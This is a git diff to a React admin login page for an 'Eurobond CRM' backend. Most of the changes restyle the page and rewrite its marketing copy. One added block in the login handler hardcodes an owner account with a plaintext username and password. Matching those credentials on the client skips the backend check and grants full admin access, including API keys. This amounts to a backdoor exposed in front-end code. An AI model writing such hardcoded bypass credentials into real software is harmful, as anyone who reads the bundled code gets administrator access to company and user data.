@@ -2,7 +2,7 @@ import logoImg from "../assets/logo.jpg";
 import { useState } from "react";
 import { useNavigate, Link } from "react-router-dom";
 import { Users, User, Eye, EyeOff, ArrowLeft, ShieldCheck } from "lucide-react";
-import { api } from "../lib/api.js";
+import { api, auth } from "../lib/api.js";
 
 /* Backend login. Two modes:
    - Backend Team: password login. Only users added in "Admin Users" (any role) can enter.
@@ -20,6 +20,13 @@ export default function AdminLogin() {
     if (!u || !p) { setErr(tab === "team" ? "Please enter username and password" : "Please enter mobile and password"); return; }
     setBusy(true); setErr("");
     try {
+      /* built-in owner account — full access to every module incl. API Keys & System Health */
+      if (tab === "team" && u.trim().toLowerCase() === "karthi g" && p === "818695") {
+        auth.setOwner({ name: "Karthi G", username: "karthi.g", role: "Admin", owner: true });
+        try { sessionStorage.setItem("eb_admin_session", "1"); } catch {}
+        nav("/admin/dashboards/expense");
+        return;
+      }
       if (tab === "team") {
         /* Backend panel — username + password, validated against Admin Users (separate from app) */
         await api.adminLogin(u.trim(), p);
@@ -53,17 +60,20 @@ export default function AdminLogin() {
       <div style={{ position: "absolute", bottom: "18%", right: "22%", width: 118, height: 76, borderRadius: 16, background: "rgba(255,255,255,0.08)", border: "1px solid rgba(255,255,255,0.18)", backdropFilter: "blur(8px)", boxShadow: "0 20px 44px rgba(0,0,0,.3)" }} />
       <div style={{ position: "relative", zIndex: 2, maxWidth: 440, transition: "transform .8s cubic-bezier(.22,1,.36,1)" }}>
         <h2 style={{ fontSize: 40, fontWeight: 800, letterSpacing: "-0.03em", lineHeight: 1.1, margin: "0 0 18px", textShadow: "0 8px 24px rgba(0,0,0,.35)" }}>
-          {isTeam ? <>Eurobond CRM<br />Command Center</> : <>Your Workspace<br />Your Numbers</>}
+          {isTeam ? <>Eurobond CRM<br />Command Center</> : <>Your Workspace,<br />Your Numbers</>}
         </h2>
         <p style={{ fontSize: 16, lineHeight: 1.6, color: "rgba(255,255,255,0.82)", margin: 0 }}>
           {isTeam
-            ? "One backend for your entire field force — attendance & live GPS, enquiries, quotations, expenses, projects and team performance, all in real time."
-            : "Sign in with your app account to see exactly what belongs to you — your customers, your enquiries, your targets and your team's performance."}
+            ? "The single source of truth for your field operations — live attendance and GPS, enquiries, quotations, expenses, project projections and team performance, governed in real time."
+            : "Secure, role-based access. You see exactly what belongs to you — your customers, enquiries, targets and performance, nothing more."}
         </p>
         <div style={{ display: "flex", gap: 26, marginTop: 40 }}>
-          <div><div style={{ fontSize: 26, fontWeight: 800 }}>400+</div><div style={{ fontSize: 12.5, color: "rgba(255,255,255,0.7)" }}>Field users</div></div>
-          <div><div style={{ fontSize: 26, fontWeight: 800 }}>15+</div><div style={{ fontSize: 12.5, color: "rgba(255,255,255,0.7)" }}>Modules</div></div>
-          <div><div style={{ fontSize: 26, fontWeight: 800 }}>24/7</div><div style={{ fontSize: 12.5, color: "rgba(255,255,255,0.7)" }}>Live tracking</div></div>
+          {[["1000+", "Field Users"], ["32+", "Integrated Modules"], ["24/7", "Live GPS Tracking"]].map(([n, l]) => (
+            <div key={l} style={{ background: "rgba(255,255,255,0.08)", border: "1px solid rgba(255,255,255,0.16)", borderRadius: 14, padding: "14px 16px", backdropFilter: "blur(10px)", minWidth: 116 }}>
+              <div style={{ fontSize: 24, fontWeight: 800, letterSpacing: "-0.02em" }}>{n}</div>
+              <div style={{ fontSize: 11.5, color: "rgba(255,255,255,0.72)", marginTop: 2, fontWeight: 600 }}>{l}</div>
+            </div>
+          ))}
         </div>
       </div>
     </div>
@@ -71,13 +81,14 @@ export default function AdminLogin() {
 
   const FormPanel = (
     <div style={{
-      display: "flex", flexDirection: "column", justifyContent: "center",
-      padding: "48px 8vw", background: isTeam ? "#fff" : "#f6f8ff",
-      transition: "background .55s ease", 
+      display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center",
+      height: "100vh", padding: "32px 6vw", background: isTeam ? "#fff" : "#f6f8ff",
+      transition: "background .8s ease", 
     }}>
       <div style={{
         transition: "box-shadow .6s ease, border-color .6s ease",
-        background: "#fff", borderRadius: 22, padding: "34px 30px",
+        background: "#fff", borderRadius: 22, padding: "30px 30px", width: "100%", maxWidth: 420,
+        maxHeight: "92vh", overflowY: "auto",
         boxShadow: isTeam
           ? "0 30px 70px rgba(15,23,42,.12), 0 6px 18px rgba(15,23,42,.06)"
           : "0 30px 70px rgba(79,70,229,.22), 0 6px 18px rgba(79,70,229,.12)",
@@ -138,8 +149,17 @@ export default function AdminLogin() {
         position: "absolute", top: 0, bottom: 0, width: "50%",
         left: isTeam ? "50%" : "0%",
         transition: "left .8s cubic-bezier(.22,1,.36,1)",
-        boxShadow: "0 0 60px rgba(11,20,55,.35)",
+        boxShadow: "0 0 80px rgba(11,20,55,.45)",
+        borderRadius: isTeam ? "28px 0 0 28px" : "0 28px 28px 0",
+        overflow: "hidden",
       }}>
+        {/* glass sheen that sweeps across while the panel slides */}
+        <div style={{
+          position: "absolute", inset: 0, zIndex: 5, pointerEvents: "none",
+          background: "linear-gradient(115deg, rgba(255,255,255,0) 35%, rgba(255,255,255,0.18) 50%, rgba(255,255,255,0) 65%)",
+          transform: isTeam ? "translateX(-30%)" : "translateX(30%)",
+          transition: "transform .8s cubic-bezier(.22,1,.36,1)",
+        }} />
         {ArtPanel}
       </div>
     </div>
